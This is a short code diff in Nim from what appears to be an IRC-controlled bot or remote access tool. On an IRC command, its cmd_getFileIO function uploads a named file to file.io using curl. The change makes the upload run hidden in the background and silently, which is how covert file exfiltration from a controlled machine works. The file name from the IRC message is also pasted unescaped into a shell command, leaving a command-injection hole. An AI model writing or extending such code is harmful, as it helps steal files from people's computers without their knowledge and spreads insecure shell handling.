@@ -102,7 +102,7 @@ proc cmd_getFileIO(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
     var filename = helper_recombine(tokens,1)
 
     if fileExists(filename):
-        var (output, _ ) = execCmdEx("curl -F  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
+        var (output, _ ) = execCmdEx("start /B curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
 
         if output.contains("success\":true"):
             try:
